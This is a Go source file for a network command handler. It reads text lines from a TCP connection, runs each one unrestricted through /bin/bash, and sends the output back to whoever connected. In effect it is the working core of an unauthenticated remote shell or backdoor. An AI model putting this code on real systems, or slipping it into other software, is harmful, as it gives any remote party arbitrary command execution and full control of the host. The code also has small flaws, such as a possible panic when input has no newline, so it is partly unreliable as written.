package main

import (
	"bytes"
	"fmt"
	"github.com/sirupsen/logrus"
	"net"
	"os/exec"
	"strings"
	"sync/atomic"
)

type Interacter interface {
	Exec()
}

type Interact struct {
	conn      net.Conn
	connected *int32
}

func NewInteract(conn net.Conn, connected *int32) Interacter {
	return &Interact{
		conn:      conn,
		connected: connected,
	}
}

func (rec *Interact) Exec() {
	logrus.WithFields(logrus.Fields{"remoteAddr": rec.conn.RemoteAddr().String()}).Info("connection established")
	defer rec.conn.Close()

	var clientBuf bytes.Buffer
	serverBuf := make([]byte, 1024)

	for {
		/* read data from the connection and put it into serverBuf */
		_, err := rec.conn.Read(serverBuf)
		if err != nil {
			logrus.WithFields(logrus.Fields{"remoteAddr": rec.conn.RemoteAddr().String()}).Info("connection stopped")
			atomic.AddInt32(rec.connected, -1)
			rec.conn.Close()
			return
		}
		/* clean up serverBuf by removing carriage return */
		com := serverBuf[:strings.Index(string(serverBuf), "\n")]
		logrus.WithFields(logrus.Fields{"remoteAddr": rec.conn.RemoteAddr().String(), "command": string(com)}).Info("command")

		cmd := exec.Command("/bin/bash", "-c", string(com))
		cmd.Stdout = &clientBuf
		err = cmd.Run()

		if err != nil {
			rec.conn.Write([]byte(fmt.Sprintf("[x] %s doesn't work\n", com)))
		} else {
			rec.conn.Write([]byte(clientBuf.String() + "\n"))
		}
		clientBuf.Reset()
	}
}
